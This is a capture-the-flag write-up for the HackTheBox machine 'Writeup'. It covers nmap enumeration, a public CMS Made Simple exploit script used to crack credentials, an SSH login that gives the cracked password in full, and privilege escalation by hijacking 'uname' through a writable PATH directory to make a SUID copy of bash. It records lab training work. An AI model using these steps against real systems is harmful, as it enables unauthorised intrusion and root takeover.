# Writeup HackTheBox

![image](https://user-images.githubusercontent.com/5285547/124397537-3e527400-dd08-11eb-9e21-914eb4ef2ea0.png)

## Nmap 

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-title: Nothing here yet.
```


## Robots.txt

![image](https://user-images.githubusercontent.com/5285547/124394688-72259d80-dcf8-11eb-879b-2e092ef3c570.png)


## /writeup/

![image](https://user-images.githubusercontent.com/5285547/124394807-e6f8d780-dcf8-11eb-9399-2ca31be26055.png)

Checking the source code of the page we can see the CMS being used here. 

Redacted source code http://10.10.10.138/writeup/
```
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
```

I quickly found this exploit online: https://www.exploit-db.com/exploits/46635

Downloading, editing and running the exploit gave me some creds. 

Python3 version (Edited by me): https://github.com/AssassinUKG/Writeups/blob/main/hackthebox/dare/writeup/cmsExploit/cms.py

```
cms.py -u http://10.10.10.138/writeup/ --crack -w /usr/share/SecLists/Passwords/rockyou.txt
```
![image](https://user-images.githubusercontent.com/5285547/124398557-33024700-dd0e-11eb-8b70-9aac12e92f52.png)


## User

Using the found credentials we can now ssh onto the box

```
ssh jkr@10.10.10.138
raykayjay9
```

And grab the user.txt flag

## Root

I transfer linpeas.sh to the box and start it off, after a little while I can see a few paths that we have write access too. 

![image](https://user-images.githubusercontent.com/5285547/124398967-6e057a00-dd10-11eb-97fd-5a9c72e761cf.png)

Not having found mucn, let's also check the running process's with pspy64 to see whats running as root
Nothing was running that I could exploit so I went to make a new ssh connection to send some more files over to help. 
That's when I noticed the login messages in pspys output.  
Now I see a file without a full path provided. 

![image](https://user-images.githubusercontent.com/5285547/124399353-b6259c00-dd12-11eb-9f55-99b1cc6bf9b3.png)

These lines in particular are of intrest

```
2021/07/04 16:54:44 CMD: UID=0    PID=15322  | run-parts --lsbsysinit /etc/update-motd.d 
2021/07/04 16:54:44 CMD: UID=0    PID=15323  | uname -rnsom
```

Let's check the path for the paths we can write in. 

```
echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

We see /usr/local/bin is first, as we can write to it, lets make our file here.

Check to see where uname is too. 

```
find / -name uname 2>/dev/null

/bin/uname
/usr/lib/klibc/bin/uname
```

I'll make a new file called uname

```
#!/bin/bash
cp /bin/bash /tmp/b
chmod u+s /tmp/b
echo "Exploited2"
```

Then make it executable and try to login again. 

```
nano /usr/local/bin/uname
chmod +x uname
```

![image](https://user-images.githubusercontent.com/5285547/124399650-b45cd800-dd14-11eb-84b4-0708a9e1556e.png)

I see the message so we should be able to get root with 

```
/tmp/b -p
```

Success!!

![image](https://user-images.githubusercontent.com/5285547/124399683-f259fc00-dd14-11eb-9780-a0ddb82cb446.png)


